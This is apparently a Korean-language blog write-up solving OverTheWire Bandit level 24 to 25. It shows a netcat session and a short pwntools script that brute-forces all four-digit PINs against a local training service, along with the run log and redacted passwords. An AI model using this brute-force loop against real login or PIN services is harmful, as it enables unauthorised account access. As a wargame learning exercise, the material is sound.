---
title: "OverTheWire Bandit Level 24 -> 25"
published: 2026-04-28
description: "OverTheWire Bandit Level 24에서 Level 25로 가는 문제 풀이."
category: "CTF/Wargame"
tags: ["OverTheWire", "Bandit", "Wargame", "Linux", "SSH"]
listed: false
---

## Level 24 -> 25
![image.png](../bandit/image%2027.png)

```bash
axii@fedora:~/bandit$ ssh bandit24@bandit.labs.overthewire.org -p 2220

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
<redacted> 0001
Wrong! Please enter the correct current password and pincode. Try again.
<redacted> 0002
Wrong! Please enter the correct current password and pincode. Try again.
```

주어진대로 한번 연결 후 여러번 입력해도 괜찮다.

```python
from pwn import *
p=remote("localhost", 30002)

for i in range(10000):
    p.sendline(f"<redacted> {i:04d}".encode())

for l in p.recvall().decode().splitlines():
    if "Wrong" not in l:
        print(l)
```

굳이 스크립트가 아니라 pwntools 쓰는게 더 간단해 보였다.

따라서 다음과 같이 보내자.

```python
bandit24@bandit:/tmp/tmp.zyqWWpDiAK$ python3 sol.py 
Warning: _curses.error: setupterm: could not find terminal

Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
[x] Opening connection to localhost on port 30002
[x] Opening connection to localhost on port 30002: Trying 127.0.0.1
[+] Opening connection to localhost on port 30002: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 4.00KB
[x] Receiving all data: 8.00KB
[x] Receiving all data: 12.00KB
[x] Receiving all data: 16.00KB
[x] Receiving all data: 20.00KB
[x] Receiving all data: 24.00KB
[x] Receiving all data: 28.00KB
[x] Receiving all data: 32.00KB
[x] Receiving all data: 36.00KB
[x] Receiving all data: 40.00KB
[x] Receiving all data: 44.00KB
[x] Receiving all data: 48.00KB
[x] Receiving all data: 52.00KB
[x] Receiving all data: 56.00KB
[x] Receiving all data: 60.00KB
[x] Receiving all data: 64.00KB
[x] Receiving all data: 68.00KB
[x] Receiving all data: 72.00KB
[x] Receiving all data: 76.00KB
[x] Receiving all data: 80.00KB
[x] Receiving all data: 84.00KB
[x] Receiving all data: 88.00KB
[x] Receiving all data: 92.00KB
[x] Receiving all data: 96.00KB
[x] Receiving all data: 100.00KB
[x] Receiving all data: 104.00KB
[x] Receiving all data: 108.00KB
[x] Receiving all data: 112.00KB
[x] Receiving all data: 116.00KB
[x] Receiving all data: 120.00KB
[x] Receiving all data: 124.00KB
[x] Receiving all data: 128.00KB
[x] Receiving all data: 132.00KB
[x] Receiving all data: 136.00KB
[x] Receiving all data: 140.00KB
[x] Receiving all data: 144.00KB
[x] Receiving all data: 148.00KB
[x] Receiving all data: 152.00KB
[x] Receiving all data: 156.00KB
[x] Receiving all data: 160.00KB
[x] Receiving all data: 164.00KB
[x] Receiving all data: 168.00KB
[x] Receiving all data: 172.00KB
[x] Receiving all data: 176.00KB
[x] Receiving all data: 180.00KB
[x] Receiving all data: 184.00KB
[x] Receiving all data: 188.00KB
[x] Receiving all data: 192.00KB
[x] Receiving all data: 196.00KB
[x] Receiving all data: 200.00KB
[x] Receiving all data: 204.00KB
[x] Receiving all data: 208.00KB
[x] Receiving all data: 212.00KB
[x] Receiving all data: 216.00KB
[x] Receiving all data: 220.00KB
[x] Receiving all data: 224.00KB
[x] Receiving all data: 228.00KB
[x] Receiving all data: 232.00KB
[x] Receiving all data: 236.00KB
[x] Receiving all data: 240.00KB
[x] Receiving all data: 244.00KB
[x] Receiving all data: 248.00KB
[x] Receiving all data: 252.00KB
[x] Receiving all data: 256.00KB
[x] Receiving all data: 260.00KB
[x] Receiving all data: 264.00KB
[x] Receiving all data: 268.00KB
[x] Receiving all data: 272.00KB
[x] Receiving all data: 276.00KB
[x] Receiving all data: 280.00KB
[x] Receiving all data: 284.00KB
[x] Receiving all data: 288.00KB
[x] Receiving all data: 292.00KB
[x] Receiving all data: 296.00KB
[x] Receiving all data: 300.00KB
[x] Receiving all data: 304.00KB
[x] Receiving all data: 308.00KB
[x] Receiving all data: 312.00KB
[x] Receiving all data: 316.00KB
[x] Receiving all data: 320.00KB
[x] Receiving all data: 324.00KB
[x] Receiving all data: 328.00KB
[x] Receiving all data: 332.00KB
[x] Receiving all data: 336.00KB
[x] Receiving all data: 340.00KB
[x] Receiving all data: 344.00KB
[x] Receiving all data: 348.00KB
[x] Receiving all data: 352.00KB
[x] Receiving all data: 356.00KB
[x] Receiving all data: 360.00KB
[x] Receiving all data: 364.00KB
[x] Receiving all data: 368.00KB
[x] Receiving all data: 372.00KB
[x] Receiving all data: 376.00KB
[x] Receiving all data: 380.00KB
[x] Receiving all data: 384.00KB
[x] Receiving all data: 388.00KB
[x] Receiving all data: 392.00KB
[x] Receiving all data: 396.00KB
[x] Receiving all data: 400.00KB
[x] Receiving all data: 404.00KB
[x] Receiving all data: 408.00KB
[x] Receiving all data: 409.50KB
[x] Receiving all data: 413.50KB
[x] Receiving all data: 417.50KB
[x] Receiving all data: 421.50KB
[x] Receiving all data: 425.50KB
[x] Receiving all data: 429.50KB
[x] Receiving all data: 433.50KB
[x] Receiving all data: 437.50KB
[x] Receiving all data: 441.50KB
[x] Receiving all data: 445.50KB
[x] Receiving all data: 449.50KB
[x] Receiving all data: 453.50KB
[x] Receiving all data: 457.50KB
[x] Receiving all data: 461.50KB
[x] Receiving all data: 465.50KB
[x] Receiving all data: 469.50KB
[x] Receiving all data: 473.50KB
[x] Receiving all data: 477.50KB
[x] Receiving all data: 481.50KB
[x] Receiving all data: 485.50KB
[x] Receiving all data: 489.50KB
[x] Receiving all data: 493.50KB
[x] Receiving all data: 497.50KB
[x] Receiving all data: 501.50KB
[x] Receiving all data: 505.50KB
[x] Receiving all data: 509.50KB
[x] Receiving all data: 513.50KB
[x] Receiving all data: 517.50KB
[x] Receiving all data: 521.50KB
[x] Receiving all data: 525.50KB
[x] Receiving all data: 529.50KB
[x] Receiving all data: 533.50KB
[x] Receiving all data: 537.00KB
[x] Receiving all data: 541.00KB
[x] Receiving all data: 545.00KB
[x] Receiving all data: 549.00KB
[x] Receiving all data: 553.00KB
[x] Receiving all data: 557.00KB
[x] Receiving all data: 561.00KB
[x] Receiving all data: 565.00KB
[x] Receiving all data: 569.00KB
[x] Receiving all data: 573.00KB
[x] Receiving all data: 577.00KB
[x] Receiving all data: 581.00KB
[x] Receiving all data: 585.00KB
[x] Receiving all data: 585.36KB
[+] Receiving all data: Done (585.36KB)
[*] Closed connection to localhost port 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is <redacted>

bandit24@bandit:/tmp/tmp.zyqWWpDiAK$ 
```
